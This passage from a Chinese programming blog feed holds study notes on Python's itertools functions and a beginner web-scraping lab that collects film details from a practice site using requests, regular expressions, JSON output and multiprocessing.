string">'c'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>**permutations(iterable,r=None)**返回的是可迭代元素中的一个排列组合，并且是按顺序返回的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span>Running<span class="token punctuation">]</span> python <span class="token operator">-</span>u <span class="token string">"e:\pythonee\code\test.py"</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然，第 2 个参数默认为None，它表示的是返回元组（tuple) 的长度，我们来尝试一下传入第二个参数。</p><p>permutations函数当迭代对象出现相同元素时，是会产生重复结果</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span>Running<span class="token punctuation">]</span> python <span class="token operator">-</span>u <span class="token string">"e:\pythonee\code\test.py"</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">在Python的itertools模块中，permutations和product都是用于生成迭代器的函数，但它们有一些重要的区别：元素的重复与顺序：permutations函数生成的是可迭代对象，包含了原始序列中所有元素的所有可能的排列，但不包含重复的元素。排列的顺序取决于原始序列中元素的顺序。product函数生成的是可迭代对象，包含了原始序列中所有元素的笛卡尔积，允许元素重复出现。其结果是原始序列中元素的所有可能的组合。参数：permutations函数接受两个参数：一个可迭代对象和一个整数（可选），指定生成排列的长度。如果不提供第二个参数，则默认生成与原始序列长度相同的排列。product函数接受一个或多个可迭代对象作为参数，每个可迭代对象代表一个集合，它们的笛卡尔积将被计算。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="iterators-terminating-on-the-shortest-input-sequence"><a class="markdownIt-Anchor" href="#iterators-terminating-on-the-shortest-input-sequence"></a> Iterators Terminating on the Shortest Input Sequence</h3><p><strong>chain(*iterables)</strong> 可以把多个可迭代对象组合起来，形成一个更大的迭代器。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token string">'good'</span><span class="token punctuation">,</span><span class="token string">'bye'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span>Running<span class="token punctuation">]</span> python <span class="token operator">-</span>u <span class="token string">"e:\pythonee\code\test.py"</span>goodbye<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>groupby(iterable,key=None)</strong> 可以把相邻元素按照 key 函数分组，并返回相应的 key 和 groupby，如果key函数为 None，则只有相同的元素才能放在一组。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">for</span> key<span class="token punctuation">,</span> group <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'AaaBBbcCAAa'</span><span class="token punctuation">,</span> <span class="token keyword">lambda</span> c<span class="token punctuation">:</span> c<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span>Running<span class="token punctuation">]</span> python <span class="token operator">-</span>u <span class="token string">"e:\pythonee\code\test.py"</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>accumulate(iterable [,func])</strong> 可以计算出一个迭代器，这个迭代器是由特定的二元函数的累计结果生成的，如果不指定的话，默认函数为求和函数。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>accumulate<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span>Running<span class="token punctuation">]</span> python <span class="token operator">-</span>u <span class="token string">"e:\pythonee\code\test.py"</span><span class="token number">0</span><span class="token number">1</span><span class="token number">1</span><span class="token number">2</span><span class="token number">3</span><span class="token number">5</span><span class="token number">8</span><span class="token number">13</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="labs"><a class="markdownIt-Anchor" href="#labs"></a> <strong>labs</strong></h1><h2 id="lab-1"><a class="markdownIt-Anchor" href="#lab-1"></a> lab-1</h2><blockquote><p>url:<a href="https://ssr1.scrape.center/">https://ssr1.scrape.center/</a></p><p>tasks:spider the films names and details;save into json</p><p>goals: to familiar with re,requests,multiprocess</p></blockquote><p>116070</p><ul><li>Step0:  从列表页入手，观察列表页的结构和翻页规则，102条数据，11页,<strong>page格式:url/page/{pagenumber} ;detail格式:url/detail/{id}</strong></li><li>Step1：浏览器查看源码:发现电影标题都在&lt;h2&gt;标签中</li><li>Step2:  发现规律：完成列表页的爬取</li></ul><blockquote><p>思路</p><ul><li>遍历所有页码,构造10页的索引页URL</li><li>从每个索引页，分析提取每个电脑的详情页URL</li></ul></blockquote><p><strong>实现</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> logging <span class="token comment">#输出信息，错误日志，便于debug的一个库</span><span class="token keyword">import</span> re<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urljoinlogging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">,</span><span class="token builtin">format</span><span class="token operator">=</span><span class="token string">'%(asctime)s-%(levelname)s:%(message)s'</span><span class="token punctuation">)</span><span class="token comment">#定义日志输出级别以及格式</span>BASE_URL<span class="token operator">=</span><span class="token string">"https://ssr1.scrape.center"</span> <span class="token comment">#以此为基URL进行拓展目标url</span>TOTAL_PAGE<span class="token operator">=</span><span class="token number">10</span><span class="token comment">#定义一个爬取网页源码的函数</span><span class="token keyword">def</span> <span class="token function">scrape_page</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Scraping%s..."</span><span class="token punctuation">,</span>url<span class="token punctuation">)</span>    <span class="token comment">#错误处理逻辑:1.首先判断状态码是否为200，如果不是输出错误日志信息 2.此外，如果request请求出现异常,输出错误日志</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> response<span class="token punctuation">.</span>text        logging<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'get invalid status code %s while scraping %s'</span><span class="token punctuation">,</span>response<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span>url<span class="token punctuation">)</span>    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>RequestException<span class="token punctuation">:</span>        logging<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'error occurred while scraping %s'</span><span class="token punctuation">,</span>url<span class="token punctuation">,</span>exc_info<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token comment">#exc_info打印Traceback的错误堆栈信息</span><span class="token comment">#定义一个解析列表页的函数</span><span class="token keyword">def</span> <span class="token function">parse_index</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">:</span>    pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;a.*?href="(.*?)".*?class="name">'</span><span class="token punctuation">)</span><span class="token comment">#提取href属性的正则表达式</span>    items<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> items<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        detail_url<span class="token operator">=</span>urljoin<span class="token punctuation">(</span>BASE_URL<span class="token punctuation">,</span>item<span class="token punctuation">)</span>        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'get detail url %s'</span><span class="token punctuation">,</span>detail_url<span class="token punctuation">)</span>        <span class="token keyword">yield</span> detail_url        <span class="token comment">#调用yield返回完整url</span><span class="token comment">#定义一个列表页的爬取方式</span><span class="token keyword">def</span> <span class="token function">scrape_index</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">:</span>    index_url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BASE_URL<span class="token punctuation">&#125;</span></span><span class="token string">/page/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>page<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>    <span class="token keyword">return</span> scrape_page<span class="token punctuation">(</span>index_url<span class="token punctuation">)</span><span class="token comment">#定义一个详情页的爬取方式</span><span class="token keyword">def</span> <span class="token function">scrape_detail</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> scrape_page<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token comment">#到此步已经获取了所有详情网页的url，现在就该爬取url内容</span><span class="token keyword">def</span> <span class="token function">parse_detail</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#匹配图片</span>    cover_pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'class="item.*?&lt;img.*?src="(.*?)".*?class="cover">'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    <span class="token comment">#匹配名称</span>    name_pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;h2.*?>(.*?)&lt;/h2>'</span><span class="token punctuation">)</span>    <span class="token comment">#匹配类型</span>    categories_pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;button.*?category&lt;span>(.*?)&lt;/span>'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    <span class="token comment">#匹配上映时间</span>    published_at_pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'(\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;\s?上映)'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    <span class="token comment">#匹配剧情简介</span>    drama_pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;div.*?drama.*?>.*?&lt;p.*?>(.*?)&lt;/p>'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    <span class="token comment">#匹配评分</span>    score_pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;p.*?score.*?>(.*?)&lt;/p>'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    cover<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>cover_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>cover_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span>    name<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>name_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>name_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span>    categories<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>categories_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span><span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>categories_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    published_at<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>published_at_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>published_at_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span>    drama<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>drama_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>drama_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span>    score<span class="token operator">=</span><span class="token builtin">float</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>score_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>score_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token string">'cover'</span><span class="token punctuation">:</span>cover<span class="token punctuation">,</span>        <span class="token string">'name'</span><span class="token punctuation">:</span>name<span class="token punctuation">,</span>        <span class="token string">'categories'</span><span class="token punctuation">:</span>categories<span class="token punctuation">,</span>        <span class="token string">'published_at'</span><span class="token punctuation">:</span>published_at<span class="token punctuation">,</span>        <span class="token string">'drama'</span><span class="token punctuation">:</span>drama<span class="token punctuation">,</span>        <span class="token string">'score'</span><span class="token punctuation">:</span>score    <span class="token punctuation">&#125;</span><span class="token comment">#定义</span><span class="token comment">#main</span><span class="token comment">#此步已经提取了每部电影的基本信息</span><span class="token comment">#最后一步就是保存数据</span><span class="token keyword">import</span> json<span class="token keyword">from</span> os <span class="token keyword">import</span> makedirs<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> existsRESULT_DIR<span class="token operator">=</span><span class="token string">'/results'</span>exists<span class="token punctuation">(</span>RESULT_DIR<span class="token punctuation">)</span> <span class="token keyword">or</span> makedirs<span class="token punctuation">(</span>RESULT_DIR<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">save_data</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    name<span class="token operator">=</span>data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>    data_path<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>RESULT_DIR<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">.json'</span></span>    json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token builtin">open</span><span class="token punctuation">(</span>data_path<span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#indent=2代表json数据格式缩进2格，更美观，ensure_ascii:可以显示中文</span><span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>TOTAL_PAGE<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    index_html<span class="token operator">=</span>scrape_index<span class="token punctuation">(</span>page<span class="token punctuation">)</span>    detail_urls<span class="token operator">=</span>parse_index<span class="token punctuation">(</span>index_html<span class="token punctuation">)</span><span class="token comment">#获取生成器对象detail_url</span>    <span class="token keyword">for</span> detai_url <span class="token keyword">in</span> detail_urls<span class="token punctuation">:</span>        detai_url_html<span class="token operator">=</span>scrape_detail<span class="token punctuation">(</span>detai_url<span class="token punctuation">)</span>        data<span class="token operator">=</span>parse_detail<span class="token punctuation">(</span>detai_url_html<span class="token punctuation">)</span>        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'get detail data%s'</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'saveing data to json file'</span><span class="token punctuation">)</span>        save_data<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'data saved successfully'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>多线程加速</li></ul><p>改写main函数即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> multiporcessing<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">:</span>    index_html<span class="token operator">=</span>scrape_index<span class="token punctuation">(</span>page<span class="token punctuation">)</span>    detail_urls<span class="token operator">=</span>parse_index<span class="token punctuation">(</span>index_html<span class="token punctuation">)</span><span class="token comment">#获取生成器对象detail_url</span>    <span class="token keyword">for</span> detai_url <span class="token keyword">in</span> detail_urls<span class="token punctuation">:</span>        detai_url_html<span class="token operator">=</span>scrape_detail<span class="token punctuation">(</span>detai_url<span class="token punctuation">)</span>        data<span class="token operator">=</span>parse_detail<span class="token punctuation">(</span>detai_url_html<span class="token punctuation">)</span>        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'get detail data%s'</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'saveing data to json file'</span><span class="token punctuation">)</span>        save_data<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'data saved successfully'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    pool<span class="token operator">=</span>multiprocessing<span class="token punctuation">.</span>Pool<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#声明一个进程池</span>    pages<span class="token operator">=</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>TOTAL_PAGE<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    pool<span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>main<span class="token punctuation">,</span>pages<span class="token punctuation">)</span><span class="token comment">#分别把这10个页码传给这10个函数，进程池根据当前运行环境决定运行多少个进程</span>    pool<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    pool<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法学习</title>
